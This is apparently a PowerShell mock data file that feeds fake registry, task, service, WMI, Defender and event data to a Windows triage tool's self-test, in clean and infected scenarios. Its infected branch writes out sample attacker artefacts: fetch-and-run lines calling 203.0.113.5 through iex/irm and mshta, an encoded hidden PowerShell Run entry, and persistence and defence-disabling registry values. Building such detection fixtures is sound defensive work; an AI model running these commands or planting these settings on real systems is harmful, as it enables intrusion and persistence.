# Fake data set used to test Invoke-WinTriage.ps1 without touching the real system.
# Loaded through -TestHooks; the scenario comes from $env:WINTRIAGE_SCENARIO (clean | infected).
$Scenario = $env:WINTRIAGE_SCENARIO
$Bad = ($Scenario -eq 'infected')
$U = 'Registry::HKEY_USERS\S-1-5-21-1'
$NT = 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion'

$script:MockReg = @{
    "$NT\Winlogon"                                              = @{ Shell = 'explorer.exe'; Userinit = 'C:\Windows\system32\userinit.exe,' }
    'HKLM:\Software\Microsoft\Windows\CurrentVersion\Run'       = @{ SecurityHealth = 'C:\Windows\System32\SecurityHealthSystray.exe'; Contoso = '"C:\Program Files\Contoso\agent.exe" /tray' }
    'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa'                = @{ 'Authentication Packages' = @('msv1_0'); 'Notification Packages' = @('scecli'); 'Security Packages' = @('""') }
    'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager'    = @{ BootExecute = @('autocheck autochk *') }
    'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\Contoso Update' = @{ Id = '{11111111-1111-1111-1111-111111111111}'; SD = [byte[]](1, 2) }
}
# Legitimate cases that must NOT raise an alert (false-positive regression)
$script:MockReg["$U\Software\Microsoft\Office\16.0\Word\Security\Trusted Locations\Location0"] = @{ Path = '%APPDATA%\Microsoft\Templates\' }
$script:MockReg["$U\Software\Microsoft\Office\16.0\Word\Security"] = @{ VBAWarnings = 2 }
$script:MockReg["$NT\Schedule\TaskCache\Tree\Microsoft\Windows\WS\WSTask"] = @{ Id = '{44444444-4444-4444-4444-444444444444}'; SD = [byte[]](1) }   # Windows orphan (no definition)
$script:MockReg["$NT\Schedule\TaskCache\Tree\Microsoft\Windows\Clip\ClipESU"] = @{ Id = '{55555555-5555-5555-5555-555555555555}'; SD = [byte[]](1) }
if ($Bad) {
    $script:MockReg["$NT\Winlogon"].Userinit = 'C:\Windows\system32\userinit.exe,C:\Users\Public\evil.exe'
    $script:MockReg["$U\Software\Microsoft\Windows\CurrentVersion\Run"] = @{ Updater = 'powershell.exe -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAKQA=' ; Helper = 'C:\Users\alice\AppData\Roaming\unsigned_helper.exe' }
    $script:MockReg["$U\Software\Microsoft\Office\16.0\Common\Licensing\Resiliency"] = @{ TimeOfLastHeartbeatFailure = '2040-01-01T00:00:00Z' }
    $script:MockReg["$U\Software\Microsoft\Office\16.0\Word\Security"] = @{ VBAWarnings = 1 }
    $script:MockReg["$NT\SoftwareProtectionPlatform"] = @{ KeyManagementServiceName = '10.0.0.10'; KeyManagementServicePort = '1688' }
    $script:MockReg["$NT\Image File Execution Options\sethc.exe"] = @{ Debugger = 'C:\Windows\System32\cmd.exe' }
    $script:MockReg["$NT\Schedule\TaskCache\Tree\SysMon"] = @{ Id = '{22222222-2222-2222-2222-222222222222}' }                      # no SD: hidden task
    $script:MockReg["$NT\Schedule\TaskCache\Tasks\{22222222-2222-2222-2222-222222222222}"] = @{ Actions = [Text.Encoding]::Unicode.GetBytes('cmd.exe /c C:\Users\alice\.config\smt.cmd') }
    $script:MockReg["$NT\Schedule\TaskCache\Tree\Activation-Renewal"] = @{ Id = '{33333333-3333-3333-3333-333333333333}'; SD = [byte[]](1) }  # invisible to the API
    $script:MockReg["$NT\Schedule\TaskCache\Tasks\{33333333-3333-3333-3333-333333333333}"] = @{ Actions = [Text.Encoding]::Unicode.GetBytes('C:\Program Files\Activation-Renewal\Activation_task.cmd') }
    # Weakened security settings
    $script:MockReg['HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest'] = @{ UseLogonCredential = 1 }
    $script:MockReg['HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System'] = @{ EnableLUA = 0; LocalAccountTokenFilterPolicy = 1 }
    $script:MockReg["$U\Software\Microsoft\Windows\CurrentVersion\Policies\System"] = @{ DisableTaskMgr = 1 }
    $script:MockReg['HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer'] = @{ AlwaysInstallElevated = 1 }
    $script:MockReg['HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU'] = @{ NoAutoUpdate = 1 }
    $script:MockReg['HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters'] = @{ SMB1 = 1 }
    $script:MockReg['HKLM:\SYSTEM\CurrentControlSet\Control\CI\Config'] = @{ VulnerableDriverBlocklistEnable = 0 }
    # Other registry persistence: crash debugger, cmd AutoRun, UAC bypass handler, service recovery command
    $script:MockReg["$NT\AeDebug"] = @{ Debugger = 'C:\Users\Public\evil.exe -p %ld' }
    $script:MockReg["$U\Software\Microsoft\Command Processor"] = @{ AutoRun = 'C:\Users\alice\AppData\Roaming\hook.cmd' }
    $script:MockReg["$U\Software\Classes\ms-settings\shell\open\command"] = @{ '' = 'C:\Users\Public\evil.exe' }
    $script:MockReg['HKLM:\SYSTEM\CurrentControlSet\Services\ContosoAgent'] = @{ FailureCommand = 'cmd.exe /c C:\Users\Public\evil.exe' }
    # Remote administration left open
    $script:MockReg['HKLM:\SOFTWARE\Policies\Microsoft\Windows\WinRM\Service'] = @{ AllowBasic = 1; AllowUnencryptedTraffic = 1 }
    # Browser extensions: forced from a third-party server, and one sideloaded through the registry
    $script:MockReg['HKLM:\SOFTWARE\Policies\Google\Chrome\ExtensionInstallForcelist'] = @{ '1' = 'abcdefghijklmnopabcdefghijklmnop;https://cdn.example.net/updates.xml' }
    $script:MockReg['HKLM:\SOFTWARE\Google\Chrome\Extensions\ponmlkjihgfedcbaponmlkjihgfedcba'] = @{ path = 'C:\Users\Public\ext.crx'; version = '1.0' }
    # KnownDLLs: a system library redirected to a path
    $script:MockReg['HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs'] = @{ DllDirectory = '%SystemRoot%\System32'; ole32 = 'ole32.dll'; shcore = 'C:\Users\Public\shcore.dll' }
    # Office add-in whose manifest is fetched over the network, and Outlook persistence
    $script:MockReg["$U\Software\Microsoft\Office\Word\Addins\Evil.Connect"] = @{ FriendlyName = 'Document Helper'; LoadBehavior = 3; Manifest = 'http://203.0.113.5/addin.vsto|vstolocal' }
    $script:MockReg["$U\Software\Microsoft\Office\16.0\Outlook"] = @{ EnableUnsafeClientMailRules = 1 }
    $script:MockReg["$U\Software\Microsoft\Office\16.0\Outlook\WebView\Inbox"] = @{ URL = 'http://203.0.113.5/x.html' }
    # AMSI switched off for scripts, and an unsigned AMSI provider
    $script:MockReg["$U\Software\Microsoft\Windows Script\Settings"] = @{ AmsiEnable = 0 }
    $script:MockReg['HKLM:\SOFTWARE\Microsoft\AMSI\Providers\{11111111-2222-3333-4444-555555555555}'] = @{ '' = 'Helper' }
    $script:MockReg['HKLM:\SOFTWARE\Classes\CLSID\{11111111-2222-3333-4444-555555555555}\InprocServer32'] = @{ '' = 'C:\Users\Public\unsigned_amsi.dll' }
    # Shell extension loaded into explorer.exe
    $script:MockReg["$U\Software\Classes\*\ShellEx\ContextMenuHandlers\Helper"] = @{ '' = '{22222222-3333-4444-5555-666666666666}' }
    $script:MockReg["$U\Software\Classes\CLSID\{22222222-3333-4444-5555-666666666666}\InprocServer32"] = @{ '' = 'C:\Users\alice\AppData\Roaming\unsigned_shell.dll' }
    # Inbound firewall rule named like a Windows one, pointing at an unsigned binary
    $script:MockReg['HKLM:\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\FirewallRules'] = @{
        '{9c1b2f0e-0001}' = 'v2.31|Action=Allow|Active=TRUE|Dir=In|App=C:\Users\Public\evil.exe|Name=Windows Update Helper|LPort=4444|'
    }
    # Name resolution pointed elsewhere, by interface and by policy
    $script:MockReg['HKLM:\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{aaaa-0001}'] = @{ NameServer = '203.0.113.9' }
    $script:MockReg['HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\DNSClient\DnsPolicyConfig\Rule-1'] = @{ Name = '.corp.example'; GenericDNSServers = '203.0.113.9' }
    # Service whose code lives outside the system folders
    $script:MockReg['HKLM:\SYSTEM\CurrentControlSet\Services\EvilSvc\Parameters'] = @{ ServiceDll = 'C:\Users\Public\evilsvc.dll' }
}
function Get-RegValues([string]$Path) { foreach ($k in $script:MockReg.Keys) { if ($k -eq $Path) { return $script:MockReg[$k] } }; return $null }
function Get-RegSubKeys([string]$Path) {
    $p = $Path.TrimEnd('\') + '\'
    @($script:MockReg.Keys | Where-Object { $_.Length -gt $p.Length -and $_.Substring(0, $p.Length) -eq $p } | ForEach-Object { ($_.Substring($p.Length) -split '\\')[0] } | Select-Object -Unique)
}
function Test-IsAdmin { $true }
function Get-HostInfo { [pscustomobject]@{ Computer = 'PC-TEST'; User = 'TEST\alice'; OS = 'Windows 11 (fake)'; InstallDate = (Get-Date).AddYears(-1); LastBoot = (Get-Date).AddDays(-2); PartOfDomain = $false; Domain = 'WORKGROUP'; PSVersion = "$($PSVersionTable.PSVersion)" } }
function Get-UserContexts { @([pscustomobject]@{ Name = 'alice'; Sid = 'S-1-5-21-1'; Profile = $env:USERPROFILE; RegRoot = $U }) }
function Get-Sig([string]$Path) {
    $signed = ($Path -notmatch '(?i)unsigned|evil|ohook|sppc\.dll')
    [pscustomobject]@{ Exists = ($Path -notmatch 'missing'); Signed = $signed; Microsoft = ($signed -and $Path -match '(?i)[\\/]Windows[\\/]|Microsoft|^(powershell|cmd)'); Signer = $(if ($signed) { 'Contoso Ltd' } else { '' }); Status = $(if ($signed) { L 'Signed' 'Signé' } else { L 'Unsigned' 'Non signé' }) }
}
function Get-TasksData {
    $t = @([pscustomobject]@{ Path = '\'; Name = 'Contoso Update'; Actions = @('"C:\Program Files\Contoso\update.exe" /silent'); Author = 'Contoso'; Date = '2026-01-10'; User = 'SYSTEM'; State = 'Ready' },
           [pscustomobject]@{ Path = '\Microsoft\Windows\Defrag\'; Name = 'ScheduledDefrag'; Actions = @('C:\Windows\System32\defrag.exe -c'); Author = 'Microsoft'; Date = ''; User = 'SYSTEM'; State = 'Ready' },
           [pscustomobject]@{ Path = '\Microsoft\Windows\Maintenance\'; Name = 'Maintenance'; Actions = @('cmd.exe /c C:\Windows\System32\maint.cmd', 'COM:{11111111-2222-3333-4444-555555555555}'); Author = 'Microsoft'; Date = ''; User = 'SYSTEM'; State = 'Ready' })
    if ($Bad) { $t += [pscustomobject]@{ Path = '\'; Name = 'OneDrive Sync Helper'; Actions = @('mshta.exe http://203.0.113.5/a.hta'); Author = 'alice'; Date = (Get-Date).AddDays(-2).ToString('s'); User = 'alice'; State = 'Ready' } }
    $t
}
function Get-ServicesData {
    $s = @([pscustomobject]@{ Name = 'ContosoAgent'; DisplayName = 'Contoso Agent'; PathName = '"C:\Program Files\Contoso\agent.exe"'; StartMode = 'Auto'; State = 'Running'; StartName = 'LocalSystem' },
           [pscustomobject]@{ Name = 'Dnscache'; DisplayName = 'DNS Client'; PathName = 'C:\Windows\system32\svchost.exe -k NetworkService'; StartMode = 'Auto'; State = 'Running'; StartName = 'NT AUTHORITY\NetworkService' })
    if ($Bad) {
        $s += [pscustomobject]@{ Name = 'KMSELDI'; DisplayName = 'Service KMSELDI'; PathName = 'C:\Program Files\KMSpico\Service_KMS.exe'; StartMode = 'Auto'; State = 'Running'; StartName = 'LocalSystem' }
        $s += [pscustomobject]@{ Name = 'AnyDesk'; DisplayName = 'AnyDesk Service'; PathName = '"C:\Program Files (x86)\AnyDesk\AnyDesk.exe" --service'; StartMode = 'Auto'; State = 'Running'; StartName = 'LocalSystem' }
        $s += [pscustomobject]@{ Name = 'EvilSvc'; DisplayName = 'Helper Service'; PathName = 'C:\Windows\system32\svchost.exe -k netsvcs'; StartMode = 'Auto'; State = 'Running'; StartName = 'LocalSystem' }
        $s += [pscustomobject]@{ Name = 'ContosoUpd'; DisplayName = 'Contoso Updater'; PathName = 'C:\Program Files\Contoso Tools\upd.exe --silent'; StartMode = 'Auto'; State = 'Running'; StartName = 'LocalSystem' }
    }
    $s
}
function Get-ProcessesData {
    $p = @([pscustomobject]@{ ProcessId = 4321; ParentProcessId = 700; Name = 'agent.exe'; ExecutablePath = 'C:\Program Files\Contoso\agent.exe'; CommandLine = '"C:\Program Files\Contoso\agent.exe"' },
           [pscustomobject]@{ ProcessId = 900; ParentProcessId = 700; Name = 'svchost.exe'; ExecutablePath = 'C:\Windows\System32\svchost.exe'; CommandLine = 'C:\Windows\System32\svchost.exe -k netsvcs' })
    if ($Bad) { $p += [pscustomobject]@{ ProcessId = 6666; ParentProcessId = 4; Name = 'svchost.exe'; ExecutablePath = 'C:\Users\Public\svchost.exe'; CommandLine = 'C:\Users\Public\svchost.exe' } }
    $p
}
function Get-ListeningPorts { @([pscustomobject]@{ LocalAddress = '0.0.0.0'; LocalPort = 8443; OwningProcess = 4321 }) }
function Get-WmiSubscriptions {
    $w = @([pscustomobject]@{ Class = 'NTEventLogEventConsumer'; Name = 'SCM Event Log Consumer'; Detail = '' }, [pscustomobject]@{ Class = '__EventFilter'; Name = 'SCM Event Log Filter'; Detail = 'select * from MSFT_SCMEventLogEvent' })
    if ($Bad) { $w += [pscustomobject]@{ Class = 'CommandLineEventConsumer'; Name = 'Updater'; Detail = 'powershell.exe -nop -c "iex (irm http://203.0.113.5/s)"' } }
    $w
}
function Get-LicensingProducts {
    if ($Bad) { @([pscustomobject]@{ Name = 'Windows(R), Professional edition'; Description = 'Windows(R) Operating System, VOLUME_KMSCLIENT channel'; LicenseStatus = 1; GracePeriodRemaining = 6000000; PartialProductKey = 'T83GX'; KeyManagementServiceMachine = ''; DiscoveredKeyManagementServiceMachineName = '' }) }
    else { @([pscustomobject]@{ Name = 'Windows(R), Professional edition'; Description = 'Windows(R) Operating System, OEM_DM channel'; LicenseStatus = 1; GracePeriodRemaining = 0; PartialProductKey = 'ABCDE'; KeyManagementServiceMachine = ''; DiscoveredKeyManagementServiceMachineName = '' }) }
}
function Get-DefenderData {
    $prefs = [pscustomobject]@{ ExclusionPath = @(); ExclusionProcess = @(); ExclusionExtension = @()
                                DisableScriptScanning = $false; DisableArchiveScanning = $false; DisableBlockAtFirstSeen = $false
                                DisableRealtimeMonitoring = $false; MAPSReporting = 2; PUAProtection = 1 }
    $det = @(); $thr = @()
    if ($Bad) {
        $prefs.ExclusionPath = @('C:\Users\alice\AppData', 'C:\Tools\build')
        $prefs.DisableScriptScanning = $true; $prefs.MAPSReporting = 0; $prefs.PUAProtection = 0
        $det = @([pscustomobject]@{ ThreatID = 42; InitialDetectionTime = (Get-Date).AddDays(-3); Resources = @('file:_C:\Users\alice\Downloads\KMSpico.exe'); ProcessName = 'explorer.exe'; ActionSuccess = $true })
        $thr = @([pscustomobject]@{ ThreatID = 42; ThreatName = 'HackTool:Win32/AutoKMS' })
    }
    [pscustomobject]@{ Status = [pscustomobject]@{ AntivirusEnabled = $true; RealTimeProtectionEnabled = (-not $Bad); IsTamperProtected = $true; AntivirusSignatureLastUpdated = (Get-Date) }
                       Prefs = $prefs; Detections = $det; Threats = $thr; OtherAV = @('Windows Defender') }
}
function Get-EventData([string]$Log, [int[]]$Ids, [datetime]$Start, [string]$Provider) {
    if (-not $Bad) { return @() }
    if ($Log -eq 'Security' -and $Ids -contains 1102) { return @([pscustomobject]@{ Time = (Get-Date).AddDays(-1); Id = 1102; Message = 'The audit log was cleared.'; Props = @() }) }
    if ($Log -eq 'System' -and $Ids -contains 7045) { return @([pscustomobject]@{ Time = (Get-Date).AddDays(-1); Id = 7045; Message = ''; Props = @('WinUpd', 'C:\Users\Public\unsigned_svc.exe', 'user mode service', 'auto start', 'LocalSystem') }) }
    if ($Log -eq 'System' -and $Ids -contains 7040) { return @([pscustomobject]@{ Time = (Get-Date).AddDays(-1); Id = 7040; Message = 'The start type of the Windows Defender Antivirus Service service was changed from auto start to disabled.'; Props = @('WinDefend', 'auto start', 'disabled') }) }
    if ($Log -eq 'Microsoft-Windows-PowerShell/Operational' -and $Ids -contains 4104) {
        # One block that looks exactly like WinTriage's own test run logging itself (must be
        # excluded), and one real-looking activator block (must still be detected).
        return @(
            [pscustomobject]@{ Time = (Get-Date).AddHours(-1); Id = 4104; Props = @()
                Message = "Creating Scriptblock text (1 of 1):`n`$script:MockReg['x'] = @{ Name = 'KMSELDI'; PathName = 'C:\Program Files\KMSpico\Service_KMS.exe' }`n`nScriptBlock ID: 11111111-1111-1111-1111-111111111111`nPath: C:\repo\tests\Mocks.ps1" }
            [pscustomobject]@{ Time = (Get-Date).AddHours(-2); Id = 4104; Props = @()
                Message = "Creating Scriptblock text (1 of 1):`nStart-Process 'C:\Users\Public\KMSpico\kmspico.exe'`n`nScriptBlock ID: 22222222-2222-2222-2222-222222222222`nPath: C:\Users\alice\Desktop\run.ps1" }
        )
    }
    @()
}
function Get-RootCertificates {
    $c = @([pscustomobject]@{ Subject = 'CN=Microsoft Root Certificate Authority 2011, O=Microsoft Corporation, C=US'
                              Issuer = 'CN=Microsoft Root Certificate Authority 2011, O=Microsoft Corporation, C=US'
                              NotBefore = (Get-Date).AddYears(-10); NotAfter = (Get-Date).AddYears(5); Thumbprint = 'AAAA1111' })
    if ($Bad) {
        $c += [pscustomobject]@{ Subject = 'CN=DO_NOT_TRUST_FiddlerRoot, O=DO_NOT_TRUST'; Issuer = 'CN=DO_NOT_TRUST_FiddlerRoot, O=DO_NOT_TRUST'
                                 NotBefore = (Get-Date).AddYears(-1); NotAfter = (Get-Date).AddYears(1); Thumbprint = 'BBBB2222' }
        $c += [pscustomobject]@{ Subject = 'CN=Update Services CA'; Issuer = 'CN=Update Services CA'
                                 NotBefore = (Get-Date).AddDays(-3); NotAfter = (Get-Date).AddYears(9); Thumbprint = 'CCCC3333' }
    }
    $c
}
function Get-LocalUsersData { $a = @([pscustomobject]@{ Name = 'alice'; Enabled = $true; SID = 'S-1-5-21-1-1001'; LastLogon = (Get-Date); PasswordLastSet = (Get-Date).AddMonths(-3) }); if ($Bad) { $a += [pscustomobject]@{ Name = 'support$'; Enabled = $true; SID = 'S-1-5-21-1-1002'; LastLogon = $null; PasswordLastSet = (Get-Date).AddDays(-1) } }; $a }
function Get-LocalAdmins { @('PC-TEST\alice') }
function Resolve-Lnk([string]$Path) {
    if ($Bad -and $Path -match '(?i)chrome\.lnk$') { return '"C:\Program Files\Google\Chrome\Application\chrome.exe" --load-extension=C:\Users\alice\AppData\Roaming\helper' }
    'C:\Program Files\Contoso\agent.exe /startup'
}
function Get-BitsJobs { if ($Bad) { @([pscustomobject]@{ Name = 'upd'; NotifyCmd = 'C:\Users\Public\evil.exe'; Urls = @('http://203.0.113.5/p') }) } else { @() } }
function Get-DriversData {
    $d = @([pscustomobject]@{ Name = 'disk'; DisplayName = 'Disk Driver'; PathName = 'C:\Windows\System32\drivers\disk.sys'; State = 'Running'; StartMode = 'Boot' },
           [pscustomobject]@{ Name = 'ContosoFilter'; DisplayName = 'Contoso Filter'; PathName = 'C:\Program Files\Contoso\cfilter.sys'; State = 'Running'; StartMode = 'Auto' })
    if ($Bad) {
        $d += [pscustomobject]@{ Name = 'RTCore64'; DisplayName = 'Micro-Star MSI Afterburner'; PathName = 'C:\Windows\System32\drivers\RTCore64.sys'; State = 'Running'; StartMode = 'Auto' }
        $d += [pscustomobject]@{ Name = 'evilflt'; DisplayName = 'Helper'; PathName = 'C:\Users\Public\evil.sys'; State = 'Running'; StartMode = 'Auto' }
    }
    $d
}
function Get-BootConfig { if ($Bad) { @{ testsigning = 'Yes'; nointegritychecks = 'No' } } else { @{ testsigning = 'No' } } }

# System roots redirected to the sandbox created by Run-SelfTest.ps1
$SB = $env:WINTRIAGE_SANDBOX
$SysRoot = Join-Path $SB 'Windows'; $PF = Join-Path $SB 'Program Files'; $PF86 = Join-Path $SB 'Program Files (x86)'
$PData = Join-Path $SB 'ProgramData'; $PublicDir = Join-Path $SB 'Users\Public'; $CommonPF = Join-Path $PF 'Common Files'; $CommonPF86 = Join-Path $PF86 'Common Files'
